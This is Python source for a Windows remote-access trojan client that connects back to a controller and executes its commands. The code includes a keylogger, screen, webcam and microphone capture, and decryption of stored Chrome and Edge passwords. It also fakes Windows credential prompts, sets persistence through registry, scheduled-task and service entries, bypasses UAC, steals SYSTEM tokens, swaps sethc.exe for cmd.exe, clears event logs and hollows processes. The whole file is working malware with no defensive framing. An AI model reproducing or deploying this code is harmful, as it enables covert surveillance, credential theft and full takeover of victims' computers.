# coding=utf-8
import base64
import contextlib
import ctypes
import inspect
import json
import locale
import os
import pathlib
import platform
import re
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import threading
import time
import wave
import webbrowser
import winreg

import cv2
import ntsecuritycon
import psutil
import pyaudio
import pyautogui
import pyperclip
import requests
import tabulate
import win32api
import win32con
import win32crypt
import win32process
import win32profile
import win32security
import win32service
import win32ts
import winerror
import wmi
from Crypto.Cipher import AES

import askpass
import filewatch
import keylogger
import runpe

TEMP_DIR = os.path.expanduser('~') + r'\AppData\Local\Temp'
EXECUTABLE_PATH = os.path.realpath(sys.executable)


class Client:
    def __init__(self):
        self.socket = socket.socket()
        self.host = '127.0.0.1'
        self.port = 9999

    def connect(self):
        while self.socket.connect_ex((self.host, self.port)) != 0:
            time.sleep(5)

    def recv(self):
        size = struct.unpack('i', self.socket.recv(4))[0]
        return self.socket.recv(size).decode()

    def recv_file(self, file):
        size = struct.unpack('i', self.socket.recv(4))[0]
        with open(file, 'wb') as f:
            while size:
                buf = self.socket.recv(size)
                size -= len(buf)
                f.write(buf)

    def send(self, status, data):
        status = struct.pack('i', status)
        size = struct.pack('i', len(data))
        self.socket.send(status + size + data)

    def send_text(self, status, data):
        self.send(status, data.encode())

    def send_file(self, filename):
        if os.path.isfile(filename):
            with open(filename, 'rb') as f:
                self.send(1, f.read())
        else:
            self.send_text(0, '[-] File not found')

    def recv_commands(self):
        command = Command()
        self.send_text(1, str(os.getcwd()) + '> ')
        cmd = self.recv()
        cmd_name = cmd.split(' ')[0]
        cmd_arg = cmd[len(cmd_name) + 1:].strip()
        if cmd == 'null':
            pass
        elif cmd == 'kill':
            self.socket.close()
            sys.exit(0)
        elif hasattr(command, cmd_name):
            func = getattr(command, cmd_name)
            args = inspect.getfullargspec(func).args
            argc = len(args)
            if not argc:
                status, data = func()
                self.send_text(status, data)
            elif 'client' in args:
                if argc == 1:
                    func(self)
                else:
                    func(self, cmd_arg)
            else:
                status, data = func(cmd_arg)
                self.send_text(status, data)
        else:
            status, data = command.execute(cmd)
            self.send_text(status, data)


class Command:
    @staticmethod
    def cd(path):
        try:
            if not path:
                return 0, 'null'
            if os.path.exists(path):
                os.chdir(path)
                return 1, 'null'
            else:
                return 0, '[-] Cannot find the path specified'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run(process):
        try:
            if not process:
                return 0, '[-] No process name specified'
            p = subprocess.Popen(process)
            return 1, '[+] Process created: ' + str(p.pid)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def execute(command):
        try:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.DEVNULL)
            result = str(cmd.stdout.read() + cmd.stderr.read(), locale.getdefaultlocale()[1])
            if not result:
                result = 'null'
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def upload(client, filename):
        try:
            client.recv_file(filename)
            client.send_text(1, '[+] File uploaded successfully')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def download(client, filename):
        try:
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def screenshot(client):
        try:
            filename = TEMP_DIR + r'\screenshot.png'
            pyautogui.screenshot(filename)
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def webcam(client):
        try:
            filename = TEMP_DIR + r'\webcam.png'
            capture = cv2.VideoCapture(0)
            success, image = capture.read()
            if success:
                cv2.imwrite(filename, image)
                capture.release()
                client.send_file(filename)
            else:
                client.send_text(0, '[-] Webcam not found')
                return
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def record(client, seconds):
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 2
        rate = 44100
        filename = TEMP_DIR + r'\output.wav'
        try:
            seconds = int(seconds)
        except:
            seconds = 10
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=sample_format, channels=channels, rate=rate, frames_per_buffer=chunk, input=True)
            frames = []
            for i in range(0, int(rate / chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            f = wave.open(filename, 'wb')
            f.setnchannels(channels)
            f.setsampwidth(p.get_sample_size(sample_format))
            f.setframerate(rate)
            f.writeframes(b''.join(frames))
            f.close()
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def keylogger_start():
        try:
            klg = keylogger.Keylogger().get_instance()
            if klg.status():
                return 0, '[-] Keylogger already started'
            else:
                threading.Thread(target=klg.start, daemon=True).start()
                return 1, '[+] Keylogger started'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def keylogger_stop():
        try:
            klg = keylogger.Keylogger().get_instance()
            if klg.status():
                klg.stop()
                return 1, '[+] Keylogger stopped'
            else:
                return 0, '[-] Keylogger not running'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def keylogger_save(client):
        try:
            client.send_file(TEMP_DIR + r'\output.txt')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def persistence_registry():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                 winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'reverse_shell', 0, winreg.REG_SZ, EXECUTABLE_PATH)
            winreg.CloseKey(key)
            return 1, '[+] Create registry key success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_schtasks():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                cmd = subprocess.Popen(
                    'schtasks.exe /create /tn reverse_shell /sc onlogon /ru system /rl highest /tr {0} /f'.format(
                        EXECUTABLE_PATH),
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return 1, '[+] Schedule task success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                              locale.getdefaultlocale()[1])
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_service():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                cmd = subprocess.Popen(
                    'sc create reverse_shell binpath= \"{0}\" start= auto'.format(EXECUTABLE_PATH),
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return 1, '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                               locale.getdefaultlocale()[1])
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_fodhelper():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                reg_path = r'Software\Classes\ms-settings\shell\open\command'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
                p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
                p.communicate()
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
                winreg.DeleteValue(key, 'DelegateExecute')
                winreg.CloseKey(key)
                return 1, '[+] Bypass UAC success'
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_clr():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                filename = 'bypassuac_clr.dll'
                if not os.path.isfile(filename):
                    return 0, '[-] Missing {0}'.format(filename)
                dll_path = os.path.abspath(filename)
                reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
                winreg.CloseKey(key)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
                winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
                winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
                p = subprocess.Popen('mmc eventvwr.msc', shell=True)
                p.communicate()
                winreg.DeleteValue(key, 'COR_PROFILER')
                winreg.DeleteValue(key, 'COR_PROFILER_PATH')
                winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
                winreg.CloseKey(key)
                return 1, '[+] Bypass UAC success'
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_system():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            Helper.create_process_as_user(
                Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('winlogon.exe'))))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_ti():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            Helper.start_service('TrustedInstaller')
            Helper.create_process_as_user(
                Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('TrustedInstaller.exe'))))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_admin():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            pid = Helper.get_elevated_process()
            if pid is not None:
                Helper.create_process_as_user(
                    Helper.duplicate_token(Helper.get_process_token(pid)))
                return 1, '[+] Success'
            else:
                return 0, '[-] No elevated process found'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_user():
        try:
            Helper.enable_privilege('SeTcbPrivilege')
            Helper.create_process_as_user(Helper.duplicate_token(Helper.get_user_token()))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_admin():
        try:
            Helper.enable_privilege('SeTcbPrivilege')
            Helper.create_process_as_user(Helper.duplicate_token(Helper.get_linked_token(Helper.get_user_token())))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def idletime():
        try:
            return 1, '[+] User has been idle for: ' + str(
                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def poweroff():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    def bsod():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtRaiseHardError(0xc0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

    @staticmethod
    def setcritical():
        try:
            is_critical = ctypes.c_int(1)
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
            status = ctypes.windll.ntdll.NtSetInformationProcess(handle_process, 29, ctypes.byref(is_critical),
                                                                 ctypes.sizeof(ctypes.c_int))
            if not status:
                return 1, '[+] Success'
            else:
                return 0, '[-] Error: ' + str(status)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def runpe():
        try:
            src = r'c_client.exe'
            dst = r'C:\Windows\explorer.exe'
            if os.path.isfile(src) and os.path.isfile(dst):
                return 1, runpe.hollow_process(src, dst)
            else:
                return 0, '[-] File not found'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_passwords(browser):
        try:
            user_data = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data'
            passwords = Helper.get_passwords(Helper.get_master_key(user_data + r'\Local State'),
                                             user_data + r'\Default\Login Data')
            return 1, json.dumps(passwords, sort_keys=False, indent=4, ensure_ascii=False)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_bookmarks(browser):
        try:
            default = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data\Default'
            return 1, Helper.get_bookmarks(default + r'\Bookmarks')
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_history(browser):
        try:
            default = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data\Default'
            history = Helper.get_history(default + r'\History')
            return 1, json.dumps(history, sort_keys=False, indent=4, ensure_ascii=False)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def replace_files():
        try:
            sys_dir = r'C:\Windows\System32'
            if os.path.isfile(sys_dir + r'\sethc.exe.bak'):
                return '[-] File already exists'
            cmd_list = [r'takeown /f %s\sethc.exe' % sys_dir,
                        r'icacls %s\sethc.exe /grant administrators:F' % sys_dir,
                        r'move {0}\sethc.exe {0}\sethc.exe.bak'.format(sys_dir),
                        r'copy {0}\cmd.exe {0}\sethc.exe'.format(sys_dir)]
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def list_software():
        try:
            software_list = []
            for item in ((winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY),
                         (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY),
                         (winreg.HKEY_CURRENT_USER, 0)):
                software_list += Helper.enum_uninstall_key(*item)
            return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
                                        headers=['Name', 'Version', 'Publisher'])
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def web_upload(client, filename):
        try:
            if os.path.isfile(filename):
                with open(filename, 'rb') as f:
                    response = requests.post('http://{0}:8888/upload'.format(client.host), files={'file': f})
                    client.send_text(1, response.text)
            else:
                client.send_text(0, '[-] File not found')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def web_download(client, filename):
        try:
            response = requests.get('http://{0}:8888/uploads/{1}'.format(client.host, filename))
            if response.status_code == 200:
                with open(filename, 'wb') as f:
                    f.write(response.content)
                client.send_text(1, '[+] File downloaded successfully')
            else:
                client.send_text(0, '[-] ' + str(response.status_code))
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def ps():
        try:
            processes = []
            for proc in psutil.process_iter():
                try:
                    process = [proc.pid, proc.name(), proc.exe()]
                    processes.append(process)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            return 1, tabulate.tabulate(processes, headers=['PID', 'Name', 'Executable path']) + os.linesep
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def drives():
        try:
            parts = []
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                part = [partition.device, partition.fstype, Helper.get_readable_size(partition_usage.total),
                        Helper.get_readable_size(partition_usage.used),
                        Helper.get_readable_size(partition_usage.free), str(partition_usage.percent) + ' %']
                parts.append(part)

            return 1, tabulate.tabulate(parts,
                                        headers=['Mount point', 'File system', 'Total size', 'Used', 'Free',
                                                 'Percentage']) + os.linesep
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def getinfo():
        try:
            computer = wmi.WMI()
            computer_info = computer.Win32_ComputerSystem()[0]
            gpu_info = computer.Win32_VideoController()[0]
            proc_info = computer.Win32_Processor()[0]
            info = {'pid': psutil.Process().pid, 'username': psutil.Process().username(), 'exec_path': EXECUTABLE_PATH,
                    'intgty_lvl': Helper.get_integrity_level(), 'uac_lvl': Helper.get_uac_level(),
                    'hostname': platform.node(), 'platform': platform.system(), 'version': platform.version(),
                    'architecture': platform.machine(), 'manufacturer': computer_info.Manufacturer,
                    'model': computer_info.Model,
                    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB', 'cpu': proc_info.Name,
                    'graphic_card': gpu_info.name}
            result = ''
            for k, v in info.items():
                result += '{0:15}{1}'.format(k, v) + '\n'
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def msgbox(msg):
        try:
            msg = re.findall('[\']([^\']*)[\']', msg)
            if len(msg) != 2:
                return 0, '[-] Two arguments required'
            threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(None, msg[0], msg[1], 0),
                             daemon=True).start()
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def clearlog():
        try:
            cmd_list = [r'wevtutil cl System',
                        r'wevtutil cl Security',
                        r'wevtutil cl Application']
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def askpass():
        try:
            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security Update\',\'\',[Environment]::Username,' \
                   '[Environment]::UserDomainName); '
            cmd2 = 'echo $cred.getnetworkcredential().password;'
            p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
            return 1, str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def askpass_logon():
        try:
            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security\',\'\',[Environment]::Username,' \
                   '[Environment]::UserDomainName); '
            cmd2 = 'echo $cred.getnetworkcredential().password;'
            while True:
                p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
                username = os.getlogin()
                password = p.stdout.read().decode().strip()
                if Helper.logon_user(username, password):
                    return 1, password
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def askpass_secure_desktop(client):
        def func(result):
            client.send_text(1, result)

        try:
            askpass.switch_desktop(func)
        except Exception as exception:
            client.send_text(0, '[-] {}'.format(exception))

    @staticmethod
    def askuac():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                if not getattr(sys, 'frozen', False):
                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv),
                                                                 None, 1)
                else:
                    exec_copy = os.path.join(TEMP_DIR, os.path.basename(EXECUTABLE_PATH))
                    shutil.copy2(EXECUTABLE_PATH, exec_copy)
                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', r'C:\Windows\system32\cmd.exe',
                                                                 ' /c {}'.format(exec_copy),
                                                                 None, 1)
                if result > 32:
                    return 1, '[+] Success'
                else:
                    return 0, '[-] Error: {}'.format(result)
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def hideme():
        try:
            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def active_window():
        try:
            return 1, pyautogui.getActiveWindowTitle()
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def open_windows():
        try:
            titles = []
            for window in pyautogui.getAllWindows():
                if window.title.strip():
                    titles.append(window.title)
            return 1, '\n'.join(titles)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def set_wallpaper(filename):
        try:
            if os.path.isfile(filename):
                ctypes.windll.user32.SystemParametersInfoW(20, 0, str(os.path.realpath(filename)), 0)
                return 1, '[+] Success'
            else:
                return 0, '[-] File not found'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def get_clipboard():
        try:
            return 1, pyperclip.paste()
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def set_clipboard(text):
        try:
            pyperclip.copy(text)
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def zip(path=None):
        try:
            if path is None or not os.path.exists(path):
                path = os.getcwd()
            shutil.make_archive(os.path.basename(path), 'zip', path)
            return 1, '[-] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def unzip(filename):
        try:
            if os.path.isfile(filename):
                path = os.path.join(os.getcwd(), pathlib.Path(filename).stem)
                shutil.unpack_archive(filename, path)
                return 1, '[-] Success'
            else:
                return 0, '[-] File not found'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def open_url(url):
        try:
            if not url:
                return 0, '[-] URL required'
            webbrowser.open(url)
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def run_hide(process):
        try:
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
            info.wShowWindow = 0
            p = subprocess.Popen(process, startupinfo=info)
            return 1, '[+] Process created: {}'.format(p.pid)
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def block_input(flag):
        try:
            flag = flag.lower() in ('true', '1')
            if ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.user32.BlockInput(flag)
                return 1, '[+] {}'.format(flag)
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def filewatch(client, path=None):
        event = threading.Event()

        def func(result):
            client.send_text(1, result)

        def eof():
            client.send_text(-1, 'null')
            event.set()

        if path is None or not os.path.exists(path):
            path = os.path.join(os.path.expanduser('~'), 'Desktop')
        fw = filewatch.FileWatch().get_instance()
        fw.start_monitor(path, func, eof)
        while True:
            cmd = client.recv()
            print(cmd)
            if cmd == 'stop':
                fw.stop_monitor()
                event.wait()
                break


class Helper:
    browser_dict = {'chrome': r'\Google\Chrome', 'edge': r'\Microsoft\Edge'}

    @staticmethod
    def enable_privilege(privilege):
        privilege_id = win32security.LookupPrivilegeValue(None, privilege)
        new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
        handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
        if handle_token:
            win32security.AdjustTokenPrivileges(handle_token, 0, new_privilege)

    @staticmethod
    def start_service(service):
        handle_scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
        handle_service = win32service.OpenService(handle_scm, service,
                                                  win32service.SERVICE_START | win32service.SERVICE_QUERY_STATUS)
        status = win32service.QueryServiceStatus(handle_service)[1]
        if status == win32service.SERVICE_STOPPED:
            win32service.StartService(handle_service, None)
        win32service.CloseServiceHandle(handle_service)

    @staticmethod
    def get_pid(process):
        for proc in psutil.process_iter():
            if process in proc.name():
                return proc.pid

    @staticmethod
    def get_elevation_type(pid):
        handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
        handle_token = win32security.OpenProcessToken(handle_process, win32con.TOKEN_QUERY)
        return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenElevationType)

    @staticmethod
    def get_elevated_process():
        for proc in psutil.process_iter():
            with contextlib.suppress(Exception):
                pid = proc.pid
                if Helper.get_elevation_type(pid) == win32security.TokenElevationTypeFull:
                    return pid

    @staticmethod
    def get_process_token(pid):
        handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
        return win32security.OpenProcessToken(handle_process, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)

    @staticmethod
    def get_user_token():
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        return win32ts.WTSQueryUserToken(console_session_id)

    @staticmethod
    def duplicate_token(handle_token):
        return win32security.DuplicateTokenEx(handle_token, 3, win32con.MAXIMUM_ALLOWED,
                                              win32security.TokenPrimary,
                                              win32security.SECURITY_ATTRIBUTES())

    @staticmethod
    def get_linked_token(handle_token):
        return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenLinkedToken)

    @staticmethod
    def create_process_as_user(handle_token):
        creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
        environment = win32profile.CreateEnvironmentBlock(handle_token, False)
        win32process.CreateProcessAsUser(handle_token, EXECUTABLE_PATH, None, None, None, False,
                                         creation_flags, environment, None, win32process.STARTUPINFO())

    @staticmethod
    def get_master_key(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

    @staticmethod
    def decrypt_password(master_key, buf):
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, buf[3:15])
            password = cipher.decrypt(buf[15:])
            return password[:-16].decode()
        except:
            return None

    @staticmethod
    def get_passwords(master_key, db):
        db_copy = TEMP_DIR + r'\passwords'
        shutil.copy2(db, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        passwords = []
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            password = Helper.decrypt_password(master_key, r[2])
            if username and password:
                passwords.append({'url': url, 'username': username, 'password': password})
        cursor.close()
        conn.close()
        if os.path.isfile(db_copy):
            os.remove(db_copy)
        return passwords

    @staticmethod
    def traverse_bookmarks(items):
        bookmarks = []
        for item in items['children']:
            if item['type'] == 'folder':
                bookmarks.append(Helper.traverse_bookmarks(item))
            else:
                bookmarks.append({'name:': item['name'], 'url': item['url']})
        return {items['name']: bookmarks}

    @staticmethod
    def get_bookmarks(filename):
        with open(filename, encoding='utf-8') as f:
            data = json.load(f)
            bookmark_bar = data['roots']['bookmark_bar']
            other = data['roots']['other']
            return json.dumps([Helper.traverse_bookmarks(bookmark_bar), Helper.traverse_bookmarks(other)], indent=4,
                              ensure_ascii=False)

    @staticmethod
    def get_history(db):
        db_copy = TEMP_DIR + r'\history'
        shutil.copy2(db, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT url, title FROM urls')
        history = []
        for r in cursor.fetchall():
            history.append({'title': r[1], 'url': r[0]})
        cursor.close()
        conn.close()
        if os.path.isfile(db_copy):
            os.remove(db_copy)
        return history

    @staticmethod
    def enum_uninstall_key(reg, flag):
        software_list = []
        key = winreg.OpenKey(reg, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 0, winreg.KEY_READ | flag)
        for i in range(winreg.QueryInfoKey(key)[0]):
            software = []
            try:
                subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                software.append(winreg.QueryValueEx(subkey, 'DisplayName')[0])
                try:
                    software.append(winreg.QueryValueEx(subkey, 'DisplayVersion')[0])
                except EnvironmentError:
                    software.append(None)
                try:
                    software.append(winreg.QueryValueEx(subkey, 'Publisher')[0])
                except EnvironmentError:
                    software.append(None)
                software_list.append(software)
            except EnvironmentError:
                continue
        return software_list

    @staticmethod
    def get_readable_size(bytes, suffix='B'):
        factor = 1024
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if bytes < factor:
                return f'{bytes:.2f}{unit}{suffix}'
            bytes /= factor

    @staticmethod
    def get_integrity_level():
        intgty_lvl = {
            0x0000: 'Untrusted',
            0x1000: 'Low',
            0x2000: 'Medium',
            0x2100: 'Medium high',
            0x3000: 'High',
            0x4000: 'System',
            0x5000: 'Protected process',
        }
        handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_READ)
        sid = win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenIntegrityLevel)[0]
        return intgty_lvl.get(sid.GetSubAuthority(sid.GetSubAuthorityCount() - 1))

    @staticmethod
    def get_uac_level():
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0,
                             winreg.KEY_READ)
        i, ConsentPromptBehaviorAdmin, EnableLUA, PromptOnSecureDesktop = 0, None, None, None
        while True:
            try:
                name, data, type = winreg.EnumValue(key, i)
                if name == 'ConsentPromptBehaviorAdmin':
                    ConsentPromptBehaviorAdmin = data
                elif name == 'EnableLUA':
                    EnableLUA = data
                elif name == 'PromptOnSecureDesktop':
                    PromptOnSecureDesktop = data
                i += 1
            except WindowsError:
                break
